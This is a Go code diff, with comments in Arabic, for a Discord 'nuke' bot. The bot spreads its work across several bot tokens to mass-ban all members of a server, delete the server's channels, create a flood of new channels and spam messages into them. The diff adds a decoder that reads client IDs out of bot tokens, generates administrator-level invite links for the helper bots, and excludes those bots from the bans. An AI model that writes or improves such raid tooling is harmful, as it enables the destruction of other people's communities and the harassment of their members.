@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"net/http"
@@ -23,6 +24,24 @@ var httpClient = &http.Client{
 		IdleConnTimeout:     60 * time.Second,
 	},
 	Timeout: 10 * time.Second,
+}
+
+// دالة مساعدة لاستخراج الـ Client ID مباشرة من توكن ديسكورد بدون طلبات خارجية
+func extractClientIDFromToken(token string) string {
+	parts := strings.Split(token, ".")
+	if len(parts) == 0 {
+		return ""
+	}
+	// الجزء الأول من التوكن هو الـ ID مشفر بـ Base64
+	decoded, err := base64.RawURLEncoding.DecodeString(parts[0])
+	if err != nil {
+		// محاولة فك التشفير بالطريقة العادية إذا فشلت RawURLEncoding
+		decoded, err = base64.StdEncoding.DecodeString(parts[0])
+		if err != nil {
+			return ""
+		}
+	}
+	return string(decoded)
 }
 
 func main() {
@@ -78,6 +97,15 @@ func main() {
 		},
 	}
 
+	// هاندلر دخول البوت الأساسي لأي سيرفر (لتوليد روابط دعوة البوتات الثانوية آلياً)
+	sess.AddHandler(func(s *discordgo.Session, event *discordgo.GuildCreate) {
+		guildID := event.Guild.ID
+		fmt.Printf("\n🚀 انضم البوت الأساسي للسيرفر: %s (ID: %s)\n", event.Guild.Name, guildID)
+		
+		// استخراج التوكنات المؤقتة من الأوامر أو البيئة إن وجدت، أو طباعة التنبيه
+		fmt.Println("💡 ملاحظة: روابط إضافة البوتات الثانوية ستظهر هنا عند استخدام أمر nuke أو حفظ التوكنات.")
+	})
+
 	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
 		if i.Type != discordgo.InteractionApplicationCommand {
 			return
@@ -98,7 +126,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "⚡ جاري تنفيذ العمليات بالسرعة القصوى التامة...",
+					Content: "⚡ جاري تنفيذ العمليات وتوليد روابط البوتات المساعدة...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -125,6 +153,17 @@ func main() {
 
 			guildID := i.GuildID
 			botID := s.State.User.ID
+
+			// طباعة روابط دعوة البوتات المساعدة لهذا السيرفر تلقائياً في الكونسول
+			fmt.Printf("\n🔗 روابط دعوة البوتات المساعدة المباشرة لهذا السيرفر (Guild ID: %s):\n", guildID)
+			for idx, t := range tokens {
+				clientID := extractClientIDFromToken(t)
+				if clientID != "" {
+					inviteLink := fmt.Sprintf("https://discord.com/oauth2/authorize?client_id=%s&permissions=8&scope=bot&guild_id=%s", clientID, guildID)
+					fmt.Printf("Bot #%d: %s\n", idx+1, inviteLink)
+				}
+			}
+			fmt.Println("--------------------------------------------------")
 
 			go executeDistributedNuke(tokens, guildID, botID, roomName, roomsCount, messageContent, messagesCount, s)
 		}
@@ -161,7 +200,19 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 		}
 	}
 
-	// 1. تجهيز بايلودات الرومات مسبقاً
+	// 1. استخراج الـ IDs الخاصة بجميع البوتات المشاركة (لاستبعادها من الباند)
+	botIDs := make(map[string]bool)
+	botIDs[botID] = true
+	for _, t := range tokens {
+		tempSess, err := discordgo.New("Bot " + t)
+		if err == nil {
+			if u, err := tempSess.User("@me"); err == nil {
+				botIDs[u.ID] = true
+			}
+		}
+	}
+
+	// 2. تجهيز بايلودات الرومات مسبقاً
 	channelPayloads := make([][]byte, roomsCount)
 	for i := 0; i < roomsCount; i++ {
 		p, _ := json.Marshal(map[string]interface{}{
@@ -171,10 +222,10 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 		channelPayloads[i] = p
 	}
 
-	// 2. تجهيز بايلود الرسائل
+	// 3. تجهيز بايلود الرسائل
 	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
 
-	// 3. سحب الأعضاء
+	// 4. سحب الأعضاء مع استبعاد جميع البوتات
 	var allUserIDs []string
 	after := ""
 	for {
@@ -184,7 +235,7 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 		}
 		for _, m := range members {
 			if m != nil && m.User != nil {
-				if m.User.ID != botID {
+				if !botIDs[m.User.ID] {
 					allUserIDs = append(allUserIDs, m.User.ID)
 				}
 				after = m.User.ID
@@ -195,7 +246,7 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 		}
 	}
 
-	// 4. جلب القنوات القديمة
+	// 5. جلب القنوات القديمة
 	channels, err := s.GuildChannels(guildID)
 	var oldChannelIDs []string
 	if err == nil {
@@ -253,7 +304,10 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 			headers := getHeaders(index)
 			banURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid)
 			for {
-				banReq, _ := http.NewRequest("PUT", banURL, nil)
+				banReq, err := http.NewRequest("PUT", banURL, nil)
+				if err != nil {
+					return
+				}
 				for k, v := range headers {
 					banReq.Header.Set(k, v)
 				}
@@ -273,6 +327,7 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 					}
 					continue
 				}
+				
 				resp.Body.Close()
 				break
 			}
@@ -329,7 +384,7 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 	}
 	wgCreate.Wait()
 
-	// د. إرسال الرسائل (توازي حقيقي 100%: كل رسالة وكل روم في Goroutine مستقل ينطلقون دفعة واحدة معاً)
+	// د. إرسال الرسائل
 	time.Sleep(300 * time.Millisecond)
 
 	if len(newChannelIDs) == 0 {
